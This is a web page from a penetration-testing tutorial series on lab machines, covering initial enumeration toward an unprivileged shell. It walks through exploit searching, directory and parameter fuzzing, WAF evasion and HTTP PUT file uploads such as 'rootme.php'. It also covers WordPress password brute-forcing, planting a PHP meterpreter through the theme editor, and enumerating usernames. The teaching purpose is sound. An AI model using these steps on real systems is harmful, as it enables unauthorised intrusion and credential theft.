<!DOCTYPE html>
<html class="writer-html5" lang="en" data-content_root="../">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-R21NVEB2EY"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-R21NVEB2EY');
    </script>
    
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>From Nothing to a Unprivileged Shell &mdash; tech.bitvijays.com 2.0.0 documentation</title>
      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=80d5e7a1" />
      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=19f00094" />

  
  <!--[if lt IE 9]>
    <script src="../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script src="../_static/jquery.js?v=5d32c60e"></script>
        <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
        <script src="../_static/documentation_options.js?v=51b770b3"></script>
        <script src="../_static/doctools.js?v=9a2dae69"></script>
        <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
        <script src="../_static/debug.js"></script>
    <script src="../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="Unprivileged Shell to Privileged Shell" href="LFC-VM-P2-UnprivilegedToPrivilegedShell.html" />
    <link rel="prev" title="Initial Recon" href="LFC-VM-P0-InitialRecon.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../index.html" class="icon icon-home">
            tech.bitvijays.com
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">The Essentials</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0A-CyberSecurityEnterprise.html">Cybersecurity in an Enterprise</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0B-LinuxEssentials.html">Linux Basics</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0C-CloudEssentials.html">Cloud Infrastructure Technologies</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0E-OpenSource.html">Open Source Concepts</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0D-SecureSoftware.html">Secure Software Development Fundamentals</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Infrastructure Pentest</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P1-IntelligenceGathering.html">Intelligence Gathering</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P2-VulnerabilityAnalysis.html">Vulnerability Analysis</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P3-Exploitation.html">Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P4-PostExploitation.html">Post Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P5-Reporting.html">Reporting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P6-ConfigurationReview.html">Configuration Review</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Vulnerable Machines</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P0-InitialRecon.html">Initial Recon</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">From Nothing to a Unprivileged Shell</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#initial-enumeration">Initial Enumeration</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#searchsploit">searchsploit</a></li>
<li class="toctree-l3"><a class="reference internal" href="#seclists-org-security-mailing-list-archive">SecLists.Org Security Mailing List Archive</a></li>
<li class="toctree-l3"><a class="reference internal" href="#google-vulns">Google-Vulns</a></li>
<li class="toctree-l3"><a class="reference internal" href="#webservices">Webservices</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#whatweb">whatweb</a></li>
<li class="toctree-l4"><a class="reference internal" href="#nikto">nikto</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dirb-wfuzz-dirbuster">dirb, wfuzz, dirbuster</a></li>
<li class="toctree-l4"><a class="reference internal" href="#burpsuite-spider">BurpSuite Spider</a></li>
<li class="toctree-l4"><a class="reference internal" href="#parameter-fuzz">Parameter Fuzz?</a></li>
<li class="toctree-l4"><a class="reference internal" href="#put-method">PUT Method</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#nmap">Nmap</a></li>
<li class="toctree-l5"><a class="reference internal" href="#curl">curl</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="#wordpress">Wordpress</a></li>
<li class="toctree-l4"><a class="reference internal" href="#names-possible-usernames-passwords">Names? Possible Usernames &amp; Passwords?</a></li>
<li class="toctree-l4"><a class="reference internal" href="#brute-forcing-hydra">Brute forcing: hydra</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#help-for-module-http-post-form">Help for module http-post-form</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#reverse-shells">Reverse Shells</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#netcat-nc">netcat (nc)</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#tcp-mode">TCP Mode</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#with-the-e-option">with the -e option</a></li>
<li class="toctree-l5"><a class="reference internal" href="#without-e-option">without -e option</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="#udp-mode">UDP Mode</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#php">PHP</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#php-web-shell">PHP Web Shell</a></li>
<li class="toctree-l4"><a class="reference internal" href="#php-meterpreter">PHP Meterpreter</a></li>
<li class="toctree-l4"><a class="reference internal" href="#php-reverse-shell">PHP Reverse Shell</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#weevely">Weevely</a></li>
<li class="toctree-l3"><a class="reference internal" href="#ruby">Ruby</a></li>
<li class="toctree-l3"><a class="reference internal" href="#perl">Perl</a></li>
<li class="toctree-l3"><a class="reference internal" href="#python">Python</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#tcp">TCP</a></li>
<li class="toctree-l4"><a class="reference internal" href="#udp">UDP</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#java">Java</a></li>
<li class="toctree-l3"><a class="reference internal" href="#jsp">JSP</a></li>
<li class="toctree-l3"><a class="reference internal" href="#bash-dev-tcp">Bash /dev/tcp</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#method-1">Method 1</a></li>
<li class="toctree-l4"><a class="reference internal" href="#method-2">Method 2</a></li>
<li class="toctree-l4"><a class="reference internal" href="#method-3">Method 3</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#telnet-reverse-shell">Telnet Reverse Shell</a></li>
<li class="toctree-l3"><a class="reference internal" href="#xterm">XTerm</a></li>
<li class="toctree-l3"><a class="reference internal" href="#lynx">Lynx</a></li>
<li class="toctree-l3"><a class="reference internal" href="#mysql">MYSQL</a></li>
<li class="toctree-l3"><a class="reference internal" href="#reverse-shell-from-windows">Reverse Shell from Windows</a></li>
<li class="toctree-l3"><a class="reference internal" href="#msf-meterpreter-elf">MSF Meterpreter ELF</a></li>
<li class="toctree-l3"><a class="reference internal" href="#metasploit-msfvenom">Metasploit MSFVenom</a></li>
<li class="toctree-l3"><a class="reference internal" href="#icmp-shell">ICMP Shell</a></li>
<li class="toctree-l3"><a class="reference internal" href="#ssh-tunneling">SSH Tunneling</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#local-port-forwarding">Local Port Forwarding</a></li>
<li class="toctree-l4"><a class="reference internal" href="#remote-port-forwarding">Remote Port Forwarding</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ssh-as-socks-proxy">SSH as SOCKS Proxy</a></li>
<li class="toctree-l4"><a class="reference internal" href="#vpn-like-tunnelling">VPN-like tunnelling?</a></li>
<li class="toctree-l4"><a class="reference internal" href="#scp">SCP</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#plink">Plink</a></li>
<li class="toctree-l3"><a class="reference internal" href="#openvpn-configuration-file-reverse-shell">OpenVPN Configuration File Reverse Shell?</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#linux">Linux</a></li>
<li class="toctree-l4"><a class="reference internal" href="#windows">Windows</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#spawning-a-tty-shell">Spawning a TTY Shell</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id9">Python</a></li>
<li class="toctree-l3"><a class="reference internal" href="#sh">sh</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id10">Perl</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id11">Ruby</a></li>
<li class="toctree-l3"><a class="reference internal" href="#lua">Lua</a></li>
<li class="toctree-l3"><a class="reference internal" href="#irb">IRB</a></li>
<li class="toctree-l3"><a class="reference internal" href="#vi">VI</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id12">Nmap</a></li>
<li class="toctree-l3"><a class="reference internal" href="#expect">Expect</a></li>
<li class="toctree-l3"><a class="reference internal" href="#sneaky-stealthy-su-in-web-shells">Sneaky Stealthy SU in (Web) Shells</a></li>
<li class="toctree-l3"><a class="reference internal" href="#spawning-a-fully-interactive-ttys-shell">Spawning a Fully Interactive TTYs Shell</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#socat">Socat</a></li>
<li class="toctree-l4"><a class="reference internal" href="#stty">stty</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ssh-key">ssh-key</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#restricted-shell">Restricted Shell</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#definition">Definition</a></li>
<li class="toctree-l3"><a class="reference internal" href="#getting-out-of-restricted-shell">Getting out of restricted shell</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#reconnaissance">Reconnaissance</a></li>
<li class="toctree-l4"><a class="reference internal" href="#quick-wins">Quick Wins</a></li>
<li class="toctree-l4"><a class="reference internal" href="#taking-help-of-binaries">Taking help of binaries</a></li>
<li class="toctree-l4"><a class="reference internal" href="#sshing-from-outside">SSHing from outside</a></li>
<li class="toctree-l4"><a class="reference internal" href="#getting-out-of-rvim">Getting out of rvim</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#gather-information-from-files">Gather information from files</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#operating-system">Operating System</a></li>
<li class="toctree-l3"><a class="reference internal" href="#proc-variables">/Proc Variables</a></li>
<li class="toctree-l3"><a class="reference internal" href="#environment-variables">Environment Variables</a></li>
<li class="toctree-l3"><a class="reference internal" href="#configuration-files">Configuration Files</a></li>
<li class="toctree-l3"><a class="reference internal" href="#user-history">User History</a></li>
<li class="toctree-l3"><a class="reference internal" href="#private-ssh-keys-ssh-configuration">Private SSH Keys / SSH Configuration</a></li>
<li class="toctree-l3"><a class="reference internal" href="#logs-files">Logs Files</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P2-UnprivilegedToPrivilegedShell.html">Unprivileged Shell to Privileged Shell</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P3-TipsAndTricks.html">Tips and Tricks</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P4-Appendix.html">Appendix</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">CTF - Challenges</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-BinaryExploitation.html">Binary Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Forensics.html">Forensics</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-ReverseEngineering.html">Reverse Engineering</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Cryptography.html">Cryptography</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-CodingQuickRef.html">Coding Quick Reference</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Critical Infrastructure</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Critical_Infrastructure/LFF-CIS-IndustrialControlSystems.html">Industrial Control Systems</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Critical_Infrastructure/LFF-CIS-ElectricalGrid.html">Electrical Grid</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">tech.bitvijays.com</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">From Nothing to a Unprivileged Shell</li>
      <li class="wy-breadcrumbs-aside">
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="from-nothing-to-a-unprivileged-shell">
<h1>From Nothing to a Unprivileged Shell<a class="headerlink" href="#from-nothing-to-a-unprivileged-shell" title="Link to this heading"></a></h1>
<p>At this point, we would have an idea about the different services and service version running on the system. Besides the output given by nmap. It is also recommended to check what software is being used on the webservers (e.g. certain cms’s).</p>
<section id="initial-enumeration">
<h2>Initial Enumeration<a class="headerlink" href="#initial-enumeration" title="Link to this heading"></a></h2>
<section id="searchsploit">
<h3>searchsploit<a class="headerlink" href="#searchsploit" title="Link to this heading"></a></h3>
<p>Exploit Database Archive Search</p>
<p>First of all, we check if the operating system and/ or the exposed services are vulnerable to exploits which are already available on the internet. For example, a vulnerable service webmin is present in one of the VMs which could be exploited to extract information from the system.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">root@kali:~# </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-A<span class="w"> </span><span class="m">172</span>.16.73.128
<span class="go">**********Trimmed**************</span>
<span class="go">10000/tcp open  http        MiniServ 0.01 (Webmin httpd)</span>
<span class="go">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</span>
<span class="go">|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).</span>
<span class="go">| ndmp-version:</span>
<span class="go">|_  ERROR: Failed to get host information from server</span>
<span class="go">**********Trimmed**************</span>
</pre></div>
</div>
<p>If we search for webmin with searchsploit, we will find different exploits available for it and we just have to use the correct one based on utility and the matching version.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">root@kali:~# </span>searchsploit<span class="w"> </span>webmin
<span class="go">**********Trimmed**************</span>
<span class="go">Description                                                                            Path</span>
<span class="go">----------------------------------------------------------------------------------------------------------------</span>
<span class="go">Webmin &lt; 1.290 / Usermin &lt; 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php</span>
<span class="go">Webmin &lt; 1.290 / Usermin &lt; 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl</span>
<span class="go">Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt</span>
<span class="go">**********Trimmed**************</span>
</pre></div>
</div>
<p>Once we have figured out which exploit to check we can read about it by using the file-number. For example: 1997, 2017, 24574 in the above case.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">searchsploit -x 24674</span>
</pre></div>
</div>
<p>Searchsploit provides an option to read the nmap XML file and suggest vulnerabilities (Requires nmap -sV -x xmlfile).</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">searchsploit</span>
<span class="go">     --nmap     [file.xml]  Checks all results in Nmap&#39;s XML output with service version (e.g.: nmap -sV -oX file.xml).</span>
<span class="go">                            Use &quot;-v&quot; (verbose) to try even more combinations</span>
</pre></div>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>If we don’t manage to find an exploit for a specific version, it is recommended to check the notes of the exploits which are highlighted as they may be valid for lower versions too. For example Let’s say we are searching for exploits in Example_Software version 2.1.3. However, version 2.2.2 contains multiple vulnerablities. Reading the description for 2.2.2 we find out it’s valid for lower versions too.</p>
</div>
</section>
<section id="seclists-org-security-mailing-list-archive">
<h3>SecLists.Org Security Mailing List Archive<a class="headerlink" href="#seclists-org-security-mailing-list-archive" title="Link to this heading"></a></h3>
<p>There will be some days, when you won’t find vulnerabilities with searchsploit. In this case, we should also check the <a class="reference external" href="http://seclists.org/">SecLists.Org Security Mailing List Archive</a>, if someone has reported any bug(s) for that particular software that we can exploit.</p>
</section>
<section id="google-vulns">
<h3>Google-Vulns<a class="headerlink" href="#google-vulns" title="Link to this heading"></a></h3>
<p>It is suggested that whenever you are googling something,  you add words such as vulnerability, exploit, ctf, github, python, tool etc. to your search term. For example. Let’s say, you are stuck in a docker or on a specific cms search for docker ctf or &lt;cms_name&gt; ctf/ github etc.</p>
</section>
<section id="webservices">
<h3>Webservices<a class="headerlink" href="#webservices" title="Link to this heading"></a></h3>
<p>If a webserver is running on a machine, we can start with running</p>
<section id="whatweb">
<h4>whatweb<a class="headerlink" href="#whatweb" title="Link to this heading"></a></h4>
<p>Utilize whatweb to find what software stack a server is running.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">whatweb www.example.com</span>
<span class="go">http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], Country[INDIA][IN], Email[infosecurity@zmail.example.com], Google-Analytics[Universal][UA-6386XXXXX-2], HTML5, HTTPServer[Example Webserver], HttpOnly[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], IP[XXX.XX.XX.208], JQuery[1.11.0], Kentico-CMS, Modernizr, Script[text/javascript], Title[Welcome to Example Website ][Title element contains newline(s)!], UncommonHeaders[cteonnt-length,x-cache-control-orig,x-expires-orig], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=9,IE=edge]</span>
</pre></div>
</div>
</section>
<section id="nikto">
<h4>nikto<a class="headerlink" href="#nikto" title="Link to this heading"></a></h4>
<p>nikto - Scans a web server for known vulnerabilities.</p>
<p>It will examine a web server to find potential problems and security vulnerabilities, including:</p>
<ul class="simple">
<li><p>Server and software misconfigurations</p></li>
<li><p>Default files and programs</p></li>
<li><p>Insecure files and programs</p></li>
<li><p>Outdated servers and programs</p></li>
</ul>
</section>
<section id="dirb-wfuzz-dirbuster">
<h4>dirb, wfuzz, dirbuster<a class="headerlink" href="#dirb-wfuzz-dirbuster" title="Link to this heading"></a></h4>
<p>Furthermore, we can run the following programs to find any hidden directories.</p>
<ul class="simple">
<li><p><a class="reference external" href="https://tools.kali.org/web-applications/dirb">DIRB</a> is a Web Content Scanner. It looks for existing (and/ or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analysing the response.</p></li>
<li><p><a class="reference external" href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let’s say, when we dirb we get 50 directories. Each directory containing an image. Often, we then need to figure out which image is different. In this case, we would figure out what’s the size of the normal image and hide that particular response with wfuzz.</p></li>
<li><p><a class="reference external" href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">Dirbuster</a> : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers.</p></li>
<li><p><a class="reference external" href="https://github.com/OJ/gobuster">gobuster</a> : Gobuster is a tool used to brute-force URIs (directories and files) in web sites and DNS subdomains (with wildcard support). (golang can be installed using apt-get).</p></li>
</ul>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>Most likely, we will be using common.txt (/usr/share/wordlists/dirb/) . If it’s doesn’t find anything, it’s better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn’t work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)</p>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>If using the dirb/ wfuzz wordlist doesn’t result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories. Also, it sometimes make sense to dirb/wfuzz the IPAddress instead of the hostname like filesrv.example.com (Maybe found by automatic redirect)</p>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>It’s important to know that dirb shows the directories found based on the response code, so if a web-application shows 404 status code instead of 200, dirbuster would miss it. In that case, wfuzz or gobuster or Burpsuite would help as they check for response length too.</p>
</div>
</section>
<section id="burpsuite-spider">
<h4>BurpSuite Spider<a class="headerlink" href="#burpsuite-spider" title="Link to this heading"></a></h4>
<p>There will be some cases when dirb/ dirbuster doesn’t find anything. This happened with us on a Node.js web application. Burpsuite’s spider helped in finding extra-pages which contained the credentials.</p>
</section>
<section id="parameter-fuzz">
<h4>Parameter Fuzz?<a class="headerlink" href="#parameter-fuzz" title="Link to this heading"></a></h4>
<p>Sometimes, we might have a scenario where we have a website which might be protected by a WAF.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://IP/example</span>
</pre></div>
</div>
<p>Now, this “/example” might be a php or might be accepting a GET Parameter. In that case, we probably need to fuzz it. The hardest part is that we can only find the GET parameters by fuzzing “/example” if you get some errors from the application, so the goal is to fuzz using a special char as the parameter’s value, something like: “/example?FUZZ=’ “</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &quot;User-Agent: SomethingNotObivousforWAF&quot; &quot;http://IP/example?FUZZ=&#39;&quot;</span>
</pre></div>
</div>
<p>The other things which we may try is putting a valid command such as ‘ls, test’ so it becomes FUZZ=ls or FUZZ=test</p>
</section>
<section id="put-method">
<h4>PUT Method<a class="headerlink" href="#put-method" title="Link to this heading"></a></h4>
<p>Sometimes, it is also a good idea to check the various HTTP verbs that are available such as GET, PUT, DELETE, etc. This can be done by making an <strong>OPTIONS</strong> request.</p>
<p>Curl can be used to check the available options (supported http verbs):</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl -X OPTIONS -v http://192.168.126.129/test/</span>
<span class="go">Trying 192.168.126.129…</span>
<span class="go">Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)</span>
<span class="go">&gt; OPTIONS /test/ HTTP/1.1</span>
<span class="go">&gt; Host: 192.168.126.129</span>
<span class="go">&gt; User-Agent: curl/7.47.0</span>
<span class="go">&gt; Accept: /</span>
<span class="go">&gt;</span>
<span class="go">&lt; HTTP/1.1 200 OK</span>
<span class="go">&lt; DAV: 1,2</span>
<span class="go">&lt; MS-Author-Via: DAV</span>
<span class="go">&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK</span>
<span class="go">&lt; Allow: OPTIONS, GET, HEAD, POST</span>
<span class="go">&lt; Content-Length: 0</span>
<span class="go">&lt; Date: Fri, 29 Apr 2016 09:41:19 GMT</span>
<span class="go">&lt; Server: lighttpd/1.4.28</span>
<span class="go">&lt;</span>
<span class="go">* Connection #0 to host 192.168.126.129 left intact</span>
</pre></div>
</div>
<p>The PUT method allows you to upload a file which can help us to get a shell on the machine. There are multiple methods available for uploading a file with the PUT method mentioned on <a class="reference external" href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">Detecting and exploiting the HTTP Put Method</a></p>
<p>A few are:</p>
<section id="nmap">
<h5>Nmap<a class="headerlink" href="#nmap" title="Link to this heading"></a></h5>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 80 --script http-put --script-args http-put.url=&#39;/uploads/rootme.php&#39;,http-put.file=&#39;/tmp/rootme.php&#39;</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="curl">
<h5>curl<a class="headerlink" href="#curl" title="Link to this heading"></a></h5>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl --upload-file test.txt -v --url http://192.168.126.129/test/test.txt</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl -X PUT -d &#39;</span>
<span class="go">curl -i -X PUT -H &quot;Content-Type: application/xml; charset=utf-8&quot; -d @&quot;/tmp/some-file.xml&quot; http://IPAddress/newpage</span>
<span class="go">curl -X PUT -d &quot;text or data to put&quot; http://IPAddress/destination_page</span>
<span class="go">curl -i -H &quot;Accept: application/json&quot; -X PUT -d &quot;text or data to put&quot; http://IPAddress/new_page</span>
</pre></div>
</div>
</div></blockquote>
</section>
</section>
<section id="wordpress">
<h4>Wordpress<a class="headerlink" href="#wordpress" title="Link to this heading"></a></h4>
<p>When faced with a website that makes use of the wordpress CMS one can run wpscan. Make sure you run --enumerate u for enumerating usernames because by default wpscan doesn’t run it. Also, scan for plugins</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wpsscan</span>
<span class="go">  --url       | -u &lt;target url&gt;       The WordPress URL/domain to scan.</span>
<span class="go">  --force     | -f                    Forces WPScan to not check if the remote site is running WordPress.</span>
<span class="go">  --enumerate | -e [option(s)]        Enumeration.</span>
<span class="go">  option :</span>
<span class="go">      u        usernames from id 1 to 10</span>
<span class="go">      u[10-20] usernames from id 10 to 20 (you must write [] chars)</span>
<span class="go">      p        plugins</span>
<span class="go">      vp       only vulnerable plugins</span>
<span class="go">      ap       all plugins (can take a long time)</span>
<span class="go">      tt       timthumbs (vulnerability scanner)</span>
<span class="go">      t        themes</span>
<span class="go">      vt       only vulnerable themes</span>
<span class="go">      at       all themes (can take a long time)</span>
<span class="go">      Multiple values are allowed : &quot;-e tt,p&quot; will enumerate timthumbs and plugins</span>

<span class="go">      If no option is supplied, the default is &quot;vt,tt,u,vp&quot;</span>
<span class="go">      (only vulnerable themes, timthumbs, usernames from id 1 to 10, only vulnerable plugins)</span>
</pre></div>
</div>
<p>We can also use wpscan to bruteforce passwords for a given username</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wpscan --url http://192.168.1.2 --wordlist wordlist.txt --username example_username</span>
</pre></div>
</div>
<p><strong>Tips</strong></p>
<ul class="simple">
<li><p>wpscan scans the themes, plugins by passive scanning, if we are not finding anything, it might be good idea to do scanning with all plugins (ap) and all themes (at). Sometimes, plugin may fake their version, so probably, good idea to readme and check for vulns.</p></li>
<li><p>If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible ways is to go to Appearance &gt; Editor &gt; Edit 404 Template.</p></li>
<li><p>The configuration of worpdress is normally speaking stored in <strong>wp-config.php</strong>. If you are able to download it, you might be lucky and be able to loot plaintext username and passwords to the database or wp-admin page.</p></li>
<li><p>If the website is vulnerable for SQL-Injection. We should be able to extract the wordpress users and their password hashes. However, if the password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.</p></li>
<li><p>Got wordpress credentials, maybe utilize <a class="reference external" href="https://wordpress.org/plugins/wpterm/">WPTerm</a> an xterm-like plugin. It can be used to run non-interactive shell commands from the WordPress admin dashboard.</p></li>
<li><p>If there’s a custom plugin created, it would probably be in the location</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://IP/wp-content/plugins/custompluginname</span>
</pre></div>
</div>
</div></blockquote>
<div class="admonition-todo admonition" id="id2">
<p class="admonition-title">Todo</p>
<p>what is the (standard) format of a wp hash and where in the database is it stored? Elborate more on wp scanning and vulnerabilities?</p>
</div>
</section>
<section id="names-possible-usernames-passwords">
<h4>Names? Possible Usernames &amp; Passwords?<a class="headerlink" href="#names-possible-usernames-passwords" title="Link to this heading"></a></h4>
<p>Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written <a class="reference external" href="https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py">namemash.py</a> which could be used to create possible usernames. However, after completion we are left with a large amount of potential usernames with no passwords.</p>
<p>If the vulnerable machine is running a SMTP mail server, we can verify if a particular username exists or not.</p>
<ul class="simple">
<li><p>Using metasploit smtp_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.</p></li>
<li><p>Using VRFY command:</p></li>
<li><p>Using RCPT TO command:</p></li>
</ul>
<p>Once we have identified a pattern of username creation, we may modify namemash.py to generate usernames and check if they exist or not.</p>
</section>
